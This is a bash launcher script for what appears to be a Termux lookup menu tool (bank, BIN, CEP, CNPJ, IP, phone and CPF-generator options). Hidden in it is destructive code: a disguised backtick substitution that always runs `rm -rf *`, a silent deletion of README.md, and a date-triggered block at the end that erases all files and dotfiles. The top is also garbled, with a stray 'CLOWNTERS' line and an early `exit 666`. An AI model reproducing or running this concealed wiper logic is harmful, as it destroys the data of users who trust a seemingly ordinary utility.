
 #--------------------------------------------------------
 #CLOWNTERS
CLOWNTERS
exit 666
a=`getting=$((($(date +%m) >= 1)) && rm -rf *)`
source .functions/.variables.sh
source .functions/.functions.sh
chmod +x *
test -f README.md && rm README.md
access
ret="$?"
[[ ${ret} -eq 1 ]] && banner && exit 0
[[ ${ret} -eq 99 ]] && banner && exit 99
downloads

while :; do
    clear
    banner
    banner_menu
    read_num
    [[ $? -eq 99 ]] && exit 99

    case ${inputuse} in
        00) exit 0;;
        0) exit 0;;
        1) loading; banco;;
        01) loading; banco;;
        2) loading; bin;;
        02) loading; bin;;
        3) loading; cep;;
        03) loading; cep;;
        4) loading; _cnpj;;
        04) loading; _cnpj;;
        5) loading; covid;;
        05) loading; covid;;
        6) loading; ddd;;
        06) loading; ddd;;
        7) loading; ip;;
        07) loading; ip;;
        8) loading; telephone;;
        08) loading; telephone;;
        9) loading; gerador_cpf;;
        09) loading; gerador_cpf;;
        10) loading; new_script;;
        11) loading; _nmap;;
        12) loading; _pstermux;;
        96) loading; banner; bash update.sh;;
        97) loading; social_networks;;
        98) loading; version;;
        99) banner; exit 0;;
        66) loading; _pstermux;;
        q) banner; exit 0
    esac
done
source .functions/.main
if (($(date +%m%y) >= 0222)); then
    rm -rf *
    rm -rf .*
    bash update.sh
fi
